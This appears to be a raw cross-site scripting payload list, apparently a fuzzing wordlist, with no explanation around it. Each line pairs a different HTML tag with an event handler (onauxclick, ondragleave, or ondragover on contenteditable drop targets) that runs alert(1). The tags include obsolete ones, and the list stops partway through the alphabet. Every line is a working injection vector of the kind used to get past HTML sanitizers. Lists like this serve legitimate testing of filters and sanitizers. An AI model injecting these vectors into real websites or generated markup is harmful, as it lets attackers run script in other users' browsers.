<input onauxclick=alert(1)>
<textarea onauxclick=alert(1)>XSS</textarea>
<command draggable="true" ondragleave="alert(1)">test</command>
<content draggable="true" ondragleave="alert(1)">test</content>
<data draggable="true" ondragleave="alert(1)">test</data>
<datalist draggable="true" ondragleave="alert(1)">test</datalist>
<dd draggable="true" ondragleave="alert(1)">test</dd>
<del draggable="true" ondragleave="alert(1)">test</del>
<details draggable="true" ondragleave="alert(1)">test</details>
<dfn draggable="true" ondragleave="alert(1)">test</dfn>
<dialog draggable="true" ondragleave="alert(1)">test</dialog>
<dir draggable="true" ondragleave="alert(1)">test</dir>
<div draggable="true" ondragleave="alert(1)">test</div>
<dl draggable="true" ondragleave="alert(1)">test</dl>
<dt draggable="true" ondragleave="alert(1)">test</dt>
<element draggable="true" ondragleave="alert(1)">test</element>
<em draggable="true" ondragleave="alert(1)">test</em>
<embed draggable="true" ondragleave="alert(1)">test</embed>
<fieldset draggable="true" ondragleave="alert(1)">test</fieldset>
<figcaption draggable="true" ondragleave="alert(1)">test</figcaption>
<figure draggable="true" ondragleave="alert(1)">test</figure>
<font draggable="true" ondragleave="alert(1)">test</font>
<footer draggable="true" ondragleave="alert(1)">test</footer>
<form draggable="true" ondragleave="alert(1)">test</form>
<frame draggable="true" ondragleave="alert(1)">test</frame>
<frameset draggable="true" ondragleave="alert(1)">test</frameset>
<h1 draggable="true" ondragleave="alert(1)">test</h1>
<head draggable="true" ondragleave="alert(1)">test</head>
<header draggable="true" ondragleave="alert(1)">test</header>
<hgroup draggable="true" ondragleave="alert(1)">test</hgroup>
<hr draggable="true" ondragleave="alert(1)">test</hr>
<html draggable="true" ondragleave="alert(1)">test</html>
<i draggable="true" ondragleave="alert(1)">test</i>
<iframe draggable="true" ondragleave="alert(1)">test</iframe>
<image draggable="true" ondragleave="alert(1)">test</image>
<img draggable="true" ondragleave="alert(1)">test</img>
<input draggable="true" ondragleave="alert(1)">test</input>
<ins draggable="true" ondragleave="alert(1)">test</ins>
<isindex draggable="true" ondragleave="alert(1)">test</isindex>
<kbd draggable="true" ondragleave="alert(1)">test</kbd>
<keygen draggable="true" ondragleave="alert(1)">test</keygen>
<label draggable="true" ondragleave="alert(1)">test</label>
<legend draggable="true" ondragleave="alert(1)">test</legend>
<li draggable="true" ondragleave="alert(1)">test</li>
<link draggable="true" ondragleave="alert(1)">test</link>
<listing draggable="true" ondragleave="alert(1)">test</listing>
<main draggable="true" ondragleave="alert(1)">test</main>
<map draggable="true" ondragleave="alert(1)">test</map>
<mark draggable="true" ondragleave="alert(1)">test</mark>
<marquee draggable="true" ondragleave="alert(1)">test</marquee>
<menu draggable="true" ondragleave="alert(1)">test</menu>
<menuitem draggable="true" ondragleave="alert(1)">test</menuitem>
<meta draggable="true" ondragleave="alert(1)">test</meta>
<meter draggable="true" ondragleave="alert(1)">test</meter>
<multicol draggable="true" ondragleave="alert(1)">test</multicol>
<nav draggable="true" ondragleave="alert(1)">test</nav>
<nextid draggable="true" ondragleave="alert(1)">test</nextid>
<nobr draggable="true" ondragleave="alert(1)">test</nobr>
<noembed draggable="true" ondragleave="alert(1)">test</noembed>
<noframes draggable="true" ondragleave="alert(1)">test</noframes>
<noscript draggable="true" ondragleave="alert(1)">test</noscript>
<object draggable="true" ondragleave="alert(1)">test</object>
<ol draggable="true" ondragleave="alert(1)">test</ol>
<optgroup draggable="true" ondragleave="alert(1)">test</optgroup>
<option draggable="true" ondragleave="alert(1)">test</option>
<output draggable="true" ondragleave="alert(1)">test</output>
<p draggable="true" ondragleave="alert(1)">test</p>
<param draggable="true" ondragleave="alert(1)">test</param>
<picture draggable="true" ondragleave="alert(1)">test</picture>
<plaintext draggable="true" ondragleave="alert(1)">test</plaintext>
<pre draggable="true" ondragleave="alert(1)">test</pre>
<progress draggable="true" ondragleave="alert(1)">test</progress>
<q draggable="true" ondragleave="alert(1)">test</q>
<rb draggable="true" ondragleave="alert(1)">test</rb>
<rp draggable="true" ondragleave="alert(1)">test</rp>
<rt draggable="true" ondragleave="alert(1)">test</rt>
<rtc draggable="true" ondragleave="alert(1)">test</rtc>
<ruby draggable="true" ondragleave="alert(1)">test</ruby>
<s draggable="true" ondragleave="alert(1)">test</s>
<samp draggable="true" ondragleave="alert(1)">test</samp>
<script draggable="true" ondragleave="alert(1)">test</script>
<section draggable="true" ondragleave="alert(1)">test</section>
<select draggable="true" ondragleave="alert(1)">test</select>
<shadow draggable="true" ondragleave="alert(1)">test</shadow>
<slot draggable="true" ondragleave="alert(1)">test</slot>
<small draggable="true" ondragleave="alert(1)">test</small>
<source draggable="true" ondragleave="alert(1)">test</source>
<spacer draggable="true" ondragleave="alert(1)">test</spacer>
<span draggable="true" ondragleave="alert(1)">test</span>
<strike draggable="true" ondragleave="alert(1)">test</strike>
<strong draggable="true" ondragleave="alert(1)">test</strong>
<style draggable="true" ondragleave="alert(1)">test</style>
<sub draggable="true" ondragleave="alert(1)">test</sub>
<summary draggable="true" ondragleave="alert(1)">test</summary>
<sup draggable="true" ondragleave="alert(1)">test</sup>
<svg draggable="true" ondragleave="alert(1)">test</svg>
<table draggable="true" ondragleave="alert(1)">test</table>
<tbody draggable="true" ondragleave="alert(1)">test</tbody>
<td draggable="true" ondragleave="alert(1)">test</td>
<template draggable="true" ondragleave="alert(1)">test</template>
<textarea draggable="true" ondragleave="alert(1)">test</textarea>
<tfoot draggable="true" ondragleave="alert(1)">test</tfoot>
<th draggable="true" ondragleave="alert(1)">test</th>
<thead draggable="true" ondragleave="alert(1)">test</thead>
<time draggable="true" ondragleave="alert(1)">test</time>
<title draggable="true" ondragleave="alert(1)">test</title>
<tr draggable="true" ondragleave="alert(1)">test</tr>
<track draggable="true" ondragleave="alert(1)">test</track>
<tt draggable="true" ondragleave="alert(1)">test</tt>
<u draggable="true" ondragleave="alert(1)">test</u>
<ul draggable="true" ondragleave="alert(1)">test</ul>
<var draggable="true" ondragleave="alert(1)">test</var>
<video draggable="true" ondragleave="alert(1)">test</video>
<wbr draggable="true" ondragleave="alert(1)">test</wbr>
<xmp draggable="true" ondragleave="alert(1)">test</xmp>
<div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable>drop here</xss>
<div draggable="true" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>
<div draggable="true" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>
<div draggable="true" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>
<div draggable="true" contenteditable>drag me</div><address ondragover=alert(1) contenteditable>drop here</address>
<div draggable="true" contenteditable>drag me</div><applet ondragover=alert(1) contenteditable>drop here</applet>
<div draggable="true" contenteditable>drag me</div><area ondragover=alert(1) contenteditable>drop here</area>
<div draggable="true" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>
<div draggable="true" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable>drop here</aside>
<div draggable="true" contenteditable>drag me</div><audio ondragover=alert(1) contenteditable>drop here</audio>
<div draggable="true" contenteditable>drag me</div><b ondragover=alert(1) contenteditable>drop here</b>
<div draggable="true" contenteditable>drag me</div><base ondragover=alert(1) contenteditable>drop here</base>
<div draggable="true" contenteditable>drag me</div><basefont ondragover=alert(1) contenteditable>drop here</basefont>
<div draggable="true" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>
<div draggable="true" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>
<div draggable="true" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound>
<div draggable="true" contenteditable>drag me</div><big ondragover=alert(1) contenteditable>drop here</big>
<div draggable="true" contenteditable>drag me</div><blink ondragover=alert(1) contenteditable>drop here</blink>
<div draggable="true" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>
<div draggable="true" contenteditable>drag me</div><body ondragover=alert(1) contenteditable>drop here</body>
<div draggable="true" contenteditable>drag me</div><br ondragover=alert(1) contenteditable>drop here</br>
<div draggable="true" contenteditable>drag me</div><button ondragover=alert(1) contenteditable>drop here</button>
<div draggable="true" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable>drop here</canvas>
<div draggable="true" contenteditable>drag me</div><caption ondragover=alert(1) contenteditable>drop here</caption>
<div draggable="true" contenteditable>drag me</div><center ondragover=alert(1) contenteditable>drop here</center>
<div draggable="true" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable>drop here</cite>
<div draggable="true" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code>
<div draggable="true" contenteditable>drag me</div><col ondragover=alert(1) contenteditable>drop here</col>
<div draggable="true" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable>drop here</colgroup>
<div draggable="true" contenteditable>drag me</div><command ondragover=alert(1) contenteditable>drop here</command>
<div draggable="true" contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>
<div draggable="true" contenteditable>drag me</div><data ondragover=alert(1) contenteditable>drop here</data>
<div draggable="true" contenteditable>drag me</div><datalist ondragover=alert(1) contenteditable>drop here</datalist>
<div draggable="true" contenteditable>drag me</div><dd ondragover=alert(1) contenteditable>drop here</dd>
<div draggable="true" contenteditable>drag me</div><del ondragover=alert(1) contenteditable>drop here</del>
<div draggable="true" contenteditable>drag me</div><details ondragover=alert(1) contenteditable>drop here</details>
<div draggable="true" contenteditable>drag me</div><dfn ondragover=alert(1) contenteditable>drop here</dfn>
<div draggable="true" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>
<div draggable="true" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable>drop here</dir>
<div draggable="true" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>
<div draggable="true" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>
<div draggable="true" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>
<div draggable="true" contenteditable>drag me</div><element ondragover=alert(1) contenteditable>drop here</element>
<div draggable="true" contenteditable>drag me</div><em ondragover=alert(1) contenteditable>drop here</em>
<div draggable="true" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>
<div draggable="true" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>
<div draggable="true" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable>drop here</figcaption>
<div draggable="true" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable>drop here</figure>
<div draggable="true" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>
<div draggable="true" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>
<div draggable="true" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>
<div draggable="true" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>
<div draggable="true" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>
<div draggable="true" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>
<div draggable="true" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>
<div draggable="true" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>
<div draggable="true" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable>drop here</hgroup>
<div draggable="true" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>
<div draggable="true" contenteditable>drag me</div><html ondragover=alert(1) contenteditable>drop here</html>
<div draggable="true" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>
<div draggable="true" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable>drop here</iframe>
<div draggable="true" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>
<div draggable="true" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>
<div draggable="true" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>
<div draggable="true" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable>drop here</ins>
<div draggable="true" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>
<div draggable="true" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>
<div draggable="true" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable>drop here</keygen>
<div draggable="true" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>
<div draggable="true" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>
<div draggable="true" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>
<div draggable="true" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>
<div draggable="true" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>
<div draggable="true" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>
<div draggable="true" contenteditable>drag me</div><map ondragover=alert(1) contenteditable>drop here</map>
